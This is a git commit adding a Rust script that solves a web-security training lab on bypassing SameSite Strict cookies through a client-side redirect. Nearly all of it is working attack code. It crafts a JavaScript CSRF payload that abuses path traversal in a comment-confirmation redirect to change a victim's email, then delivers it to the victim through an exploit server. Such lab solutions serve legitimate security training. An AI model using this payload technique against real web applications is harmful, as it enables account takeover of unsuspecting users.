9d9a107a0deb33b20a0fbcea423c2b86e7d49ca7
Ahmed Elqalawii <elqalawii@proton.me>
2023-10-24 00:23:31 +0300

    Added 'SameSite Strict bypass via client-side redirect' lab

---
+++ Cross-site request forgery (CSRF)/SameSite Strict bypass via client-side redirect/src/main.rs
@@ -0,0 +1,101 @@
+/*********************************************************************************************
+*
+* Author: Ahmed Elqalawy (@elqal3awii)
+*
+* Date: 24/10/2023
+*
+* Lab: SameSite Strict bypass via client-side redirect
+*
+* Steps: 1. Exploit the redirection functionality that occurs after a comment is submitted
+*           in order to redirect the victim to their profile and change their email using
+*           URL parameters
+*        2. Deliver the exploit to the victim
+*        3. The victim's email will be changed after he trigger the exploit
+*
+**********************************************************************************************/
+#![allow(unused)]
+/***********
+* Imports
+***********/
+use reqwest::{
+    blocking::{Client, ClientBuilder, Response},
+    header::HeaderMap,
+    redirect::Policy,
+};
+use std::{
+    collections::HashMap,
+    io::{self, Write},
+    time::Duration,
+};
+use text_colorizer::Colorize;
+
+/******************
+* Main Function
+*******************/
+fn main() {
+    // change this to your lab URL
+    let lab_url = "https://0a08006303b6d9c0835cc0bc00e900ab.web-security-academy.net";
+
+    // change this to your exploit server URL
+    let exploit_server_url = "https://exploit-0a2700f003c0d950831ebf6a015500f1.exploit-server.net";
+
+    // build the client that will be used for all subsequent requests
+    let client = build_client();
+
+    // the header of your exploit sever response
+    let exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";
+
+    // the new email
+    // you can change this to what you want
+    let new_email = "hacked@you.com";
+
+    // payload to change the victim's email
+    let payload = format!(
+        r###"<script>
+                location = "{lab_url}/post/comment/confirmation?postId=../my-account/change-email%3femail=hacked%40you.com%26submit=1"
+            </script>    
+      "###
+    );
+
+    print!("{}", "❯❯ Delivering the exploit to the victim.. ".white(),);
+    io::stdout().flush();
+
+    // deliver the exploit to the victim
+    client
+        .post(exploit_server_url)
+        .form(&HashMap::from([
+            ("formAction", "DELIVER_TO_VICTIM"),
+            ("urlIsHttps", "on"),
+            ("responseFile", "/exploit"),
+            ("responseHead", exploit_server_head),
+            ("responseBody", &payload),
+        ]))
+        .send()
+        .expect(&format!(
+            "{}",
+            "[!] Failed to deliver the exploit to the victim".red()
+        ));
+
+    println!("{}", "OK".green());
+    println!(
+        "{}",
+        "🗹 The victim's email will be changed after he trigger the exploit".white()
+    );
+    println!(
+        "{} {}",
+        "🗹 Check your browser, it should be marked now as".white(),
+        "solved".green()
+    )
+}
+
+/*******************************************************************
+* Function used to build the client
+* Return a client that will be used in all subsequent requests
+********************************************************************/
+fn build_client() -> Client {
+    ClientBuilder::new()
+        .redirect(Policy::default())
+        .connect_timeout(Duration::from_secs(5))
+        .build()
+        .unwrap()
+}
